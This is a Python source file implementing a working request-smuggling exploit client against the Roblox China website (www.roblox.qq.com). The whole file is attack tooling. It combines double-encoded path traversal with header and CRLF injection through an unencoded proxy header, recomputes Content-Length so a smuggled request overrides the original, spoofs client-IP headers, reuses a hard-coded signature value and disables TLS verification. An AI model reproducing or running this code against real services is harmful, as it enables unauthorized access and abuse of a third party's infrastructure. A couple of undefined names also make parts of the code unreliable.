from urllib.parse import urlsplit, quote, unquote
from collections import OrderedDict
from collections.abc import Mapping, MutableMapping
import json as jsonlib
import http.client
import socket
import ssl
import gzip
import zlib

class CaseInsensitiveDict(MutableMapping):
    def __init__(self, data=None, **kwargs):
        self._store = OrderedDict()
        if data is None:
            data = {}
        self.update(data, **kwargs)

    def __setitem__(self, key, value):
        self._store[key.lower()] = (key, value)

    def __getitem__(self, key):
        return self._store[key.lower()][1]

    def __delitem__(self, key):
        del self._store[key.lower()]

    def __iter__(self):
        return (casedkey for casedkey, mappedvalue in self._store.values())

    def __len__(self):
        return len(self._store)

    def lower_items(self):
        return (
            (lowerkey, keyval[1])
            for (lowerkey, keyval)
            in self._store.items()
        )

    def __eq__(self, other):
        if isinstance(other, Mapping):
            other = CaseInsensitiveDict(other)
        else:
            return NotImplemented
        return dict(self.lower_items()) == dict(other.lower_items())

    def copy(self):
        return CaseInsensitiveDict(self._store.values())

    def __repr__(self):
        return str(dict(self.items()))

class Response:
    def __init__(self, status, message, headers, content):
        self.status_code = status
        self.reason = message
        self.headers = headers
        self.content = content

    def __repr__(self):
        return f"<Response [{self.status_code}]>"
    
    def json(self):
        return jsonlib.loads(self.content)
    
    @property
    def text(self):
        return self.content.decode("UTF-8", errors="ignore")

def get_external_ip():
    conn = http.client.HTTPSConnection("api.ipify.org")
    try:
        conn.request("GET", "/")
        resp = conn.getresponse()
        return resp.read().decode().rstrip()
    finally:
        conn.close()

def prepare_request(method, url, data, headers, real_ip):
    purl = urlsplit(url)
    path = purl.path + ("?" + purl.query if purl.query else "")
    path = "/account/signupredir/..%252f..%252f" + quote(path)

    # payload that'll "override" the original request
    payload = ""
    payload += " HTTP/1.1\n"
    payload += "Host: %s\n" % purl.hostname
    payload += "Content-Length: *\n"
    if headers:
        for key, value in headers.items():
            payload += "%s: %s\n" % (key, value)
    payload += "\n"
    if data:
        payload += data

    # calculate the content-length overhead
    # (the actual content of this doesn't matter, only the length)
    overhead = ""
    overhead += " HTTP/1.1\r\n"
    overhead += "Connection: keep-alive\r\n"
    overhead += "Host: %s\r\n" % "www.roblox.qq.com"
    overhead += "Roblox-Domain: cn\r\n"
    overhead += "Roblox-CNP-Date: 2021-03-06T20:41:52 08:00\r\n"
    overhead += "Roblox-CNP-Secure: cnGgYV/BzUMyhjw3iIiKi0TD6Q0=\r\n"
    overhead += "Roblox-CNP-True-IP: %s\r\n" % real_ip
    # funnily enough, this header is also left unencoded
    overhead += "Roblox-CNP-Url: http://%s%s%s\r\n" % (
        "www.roblox.qq.com",
        unquote(path),
        payload)
    overhead += "Content-Length: 0\r\n"
    overhead += "X-Stgw-Time: 1615034512.456\r\n"
    overhead += "X-Client-Proto: https\r\n"
    overhead += "X-Forwarded-Proto: https\r\n"
    overhead += "X-Client-Proto-Ver: HTTP/1.1\r\n"
    overhead += "X-Real-IP: %s\r\n" % real_ip
    overhead += "X-Forwarded-For: %s\r\n\r\n" % real_ip
    overhead = overhead.replace("*", str(len(overhead)))
    payload = payload.replace("*", str(len(overhead) ))

    # the "real" request that is sent
    request = ""
    request += "%s %s%s HTTP/1.1\r\n" % (method, path, quote(payload))
    request += "Host: %s\r\n" % "www.roblox.qq.com"
    request += "Content-Length: 0\r\n"
    request += "\r\n"

    return request.encode()

class Roblox:
    real_ip = get_external_ip()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    def __init__(self):
        self._sock = None

    def __enter__(self):
        return self
    
    def __exit__(self, *_):
        self.clear()

    def request(self, method, url, data=None, json=None, headers=None):
        headers = CaseInsensitiveDict(headers)
        
        if json is not None:
            headers["Content-Type"] = "application/json"
            data = jsonlib.dumps(json, separators=(",", ":"))
            
        if not self._sock:
            self.connect()
        
        request = prepare_request(method, url, data, headers, real_ip=self.real_ip)
        try:
            self._sock.send(request)
            response = self._get_response(1024**2, True, True)
            return response
        except:
            self.clear()
            raise

    def _get_response(self, max_chunk_size, decode_content, get_content):
        resp = self._sock.recv(max_chunk_size)

        if not resp:
            raise Exception("Empty response")

        while not b"\r\n\r\n" in resp:
            resp += self._sock.recv(max_chunk_size)

        resp, data = resp.split(b"\r\n\r\n", 1)
        resp = resp.decode()
        status, raw_headers = resp.split("\r\n", 1)
        version, status, message = status.split(" ", 2)

        headers = CaseInsensitiveDict()
        for header in raw_headers.splitlines():
            header, value = header.split(":", 1)
            value = value.lstrip(" ")
            if header in headers:
                if isinstance(headers[header], str):
                    headers[header] = [headers[header]]
                headers[header].append(value)
            else:
                headers[header] = value
        
        # download chunks until content-length is met
        if get_content:
            if "content-length" in headers:
                goal = int(headers["content-length"])
                while goal > len(data):
                    chunk = self._sock.recv(min(goal-len(data), max_chunk_size))
                    if not chunk:
                        raise RequestException("Empty chunk")
                    data += chunk
            
            # download chunks until "0\r\n\r\n" is recv'd, then process them
            elif headers.get("transfer-encoding") == "chunked":
                if not data.endswith(b"0\r\n\r\n"):
                    while True:
                        chunk = self._sock.recv(max_chunk_size)
                        data += chunk
                        if not chunk or chunk.endswith(b"0\r\n\r\n"):
                            break

                raw = data
                data = b""
                while raw:
                    length, raw = raw.split(b"\r\n", 1)
                    length = int(length, 16)
                    chunk, raw = raw[:length], raw[length+2:]
                    data += chunk

            # download chunks until recv is empty
            else:
                while True:
                    chunk = self._sock.recv(max_chunk_size)
                    if not chunk:
                        break
                    data += chunk

        if "content-encoding" in headers and decode_content:
            data = cls._decode_content(data, headers["content-encoding"])

        return Response(int(status), message, headers, data)

    @staticmethod
    def _decode_content(content, encoding):
        if encoding == "gzip":
            content = gzip.decompress(content)
        elif encoding == "deflate":
            content = zlib.decompress(content)
        return content
    
    def connect(self):
        if self._sock:
            self.clear()
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(5)
            self._sock.connect(("www.roblox.qq.com", 443))
            self._sock = self.context.wrap_socket(self._sock)
        except:
            self.clear()
            raise

    def clear(self):
        if self._sock:
            try:
                self._sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            self._sock.close()
            self._sock = None
